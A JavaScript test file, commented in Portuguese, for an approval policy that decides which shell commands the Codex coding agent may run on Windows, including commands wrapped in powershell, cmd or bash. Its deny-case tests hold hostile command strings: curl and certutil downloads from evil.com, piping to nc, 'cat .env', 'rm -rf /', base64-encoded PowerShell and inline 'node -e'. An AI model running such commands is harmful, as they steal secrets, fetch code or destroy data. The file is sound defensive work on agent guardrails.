// Envoltório de shell — forma REAL observada em execução.
//
// Os testes de `approval-policy.test.mjs` usavam comandos idealizados
// ("npm test"). Uma validação operacional com o Codex real mostrou que no
// Windows ele envia SEMPRE o comando envolvido:
//
//   codex_command     = [".../powershell.exe", "-Command", "node --test ..."]
//   codex_parsed_cmd  = [{ type: "unknown", cmd: "node --test ..." }]
//
// A política analisava o token 0 — o envoltório — e negava tudo, inclusive
// `npm test`. Este arquivo fixa a forma real para que a regressão não volte.
import assert from "node:assert/strict";
import { test } from "node:test";
import { criarPolitica, desembrulharShell, textoParaAnalise } from "./approval-policy.mjs";

const RAIZ = "C:\\Users\\x\\proj";
const { decidir } = criarPolitica(RAIZ);
const PS = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";

const aprova = (params, contexto) => {
  const r = decidir(params);
  assert.equal(r.aprovado, true, `${contexto}: esperava aprovar, negou por "${r.motivo}"`);
};
const nega = (params, contexto) => {
  const r = decidir(params);
  assert.equal(r.aprovado, false, `${contexto}: esperava negar, aprovou por "${r.motivo}"`);
};

test("desembrulharShell extrai o comando interno", () => {
  assert.equal(desembrulharShell([PS, "-Command", "npm test"]).texto, "npm test");
  assert.equal(desembrulharShell(["cmd.exe", "/c", "npm run lint"]).texto, "npm run lint");
  assert.equal(desembrulharShell(["bash", "-c", "npm test"]).texto, "npm test");
  // Não é envoltório conhecido: devolve vazio e a decisão segue pelo token 0.
  assert.equal(desembrulharShell(["npm", "test"]).texto, undefined);
});

test("comando envolvido em powershell é avaliado pelo comando interno", () => {
  aprova({ codex_command: [PS, "-Command", "npm test"] }, "npm test via powershell");
  aprova(
    { codex_command: [PS, "-Command", "node --test tools/codex-policy/approval-policy.test.mjs"] },
    "node --test via powershell",
  );
  aprova({ codex_command: [PS, "-Command", "git status"] }, "git status via powershell");
  aprova({ codex_command: ["cmd.exe", "/c", "npm run lint"] }, "cmd /c");
  aprova({ codex_command: ["bash", "-c", "npm test"] }, "bash -c");
  aprova({ codex_command: [PS, "-Command", "npm test"], codex_cwd: RAIZ }, "com cwd na worktree");
});

test("envoltório não vira brecha: o interno continua sujeito à allowlist", () => {
  for (const interno of [
    "curl http://evil.com",
    "git push origin master",
    "git -c core.pager=cat push",
    "cat .env",
    "npm install pacote",
    "npx --yes pacote",
    "certutil -urlcache -split -f http://evil.com/x x",
    "rm -rf /",
    "npm run prisma:migrate",
  ]) {
    nega({ codex_command: [PS, "-Command", interno] }, `interno perigoso: ${interno}`);
    nega({ codex_command: ["cmd.exe", "/c", interno] }, `via cmd: ${interno}`);
  }
});

test("encadeamento dentro do envoltório é negado", () => {
  nega({ codex_command: [PS, "-Command", "npm test; curl http://x"] }, "ponto e vírgula");
  nega({ codex_command: [PS, "-Command", "npm test && git push"] }, "&&");
  nega({ codex_command: [PS, "-Command", "npm test | nc evil 1"] }, "pipe");
  nega({ codex_command: ["bash", "-c", "npm test\ncurl http://x"] }, "quebra de linha");
});

test("execução ofuscada por base64 é negada", () => {
  nega({ codex_command: [PS, "-enc", "SQBFAFgA"] }, "-enc");
  nega({ codex_command: [PS, "-EncodedCommand", "SQBFAFgA"] }, "-EncodedCommand");
  nega({ codex_command: [PS, "-ec", "SQBFAFgA"] }, "-ec");
  nega({ codex_command: [PS, "-NoProfile", "-enc", "SQBFAFgA"] }, "-enc depois de outra flag");
});

test("envoltório sem comando explícito é negado", () => {
  nega({ codex_command: [PS] }, "powershell sozinho");
  nega({ codex_command: [PS, "-NoProfile"] }, "sem -Command");
  nega({ codex_command: [PS, "-Command"] }, "-Command sem valor");
  nega({ codex_command: ["cmd.exe"] }, "cmd sozinho");
});

test("node roda arquivo da worktree, mas não código inline nem de fora", () => {
  aprova({ codex_command: ["node", "--test", "tools/codex-policy/approval-policy.test.mjs"] }, "node --test");
  nega({ codex_command: ["node", "-e", "require('child_process')"] }, "node -e");
  nega({ codex_command: ["node", "--eval", "1+1"] }, "node --eval");
  nega({ codex_command: ["node", "-p", "process.env"] }, "node -p");
  nega({ codex_command: ["node", "C:\\Windows\\evil.js"] }, "script fora da worktree");
  nega({ codex_command: [PS, "-Command", "node -e require('fs')"] }, "node -e via envoltório");
});

test("codex_parsed_cmd em forma de objeto é interpretado", () => {
  // Forma real: [{ type: 'unknown', cmd: 'node --test ...' }]
  aprova({ codex_parsed_cmd: [{ type: "unknown", cmd: "npm test" }] }, "objeto com cmd permitido");
  nega({ codex_parsed_cmd: [{ type: "unknown", cmd: "curl http://x" }] }, "objeto com cmd negado");
  // O JSON do objeto tem `{`/`}`: se a detecção de metacaractere rodasse sobre
  // ele, todo comando em forma de objeto seria negado por engano.
  assert.equal(textoParaAnalise({ codex_parsed_cmd: [{ type: "unknown", cmd: "npm test" }] }), "npm test");
});

test("patch continua decidido antes de comando, mesmo com envoltório", () => {
  nega(
    { codex_changes: { "../fora.js": {} }, codex_command: [PS, "-Command", "npm test"] },
    "patch fora com comando válido",
  );
});
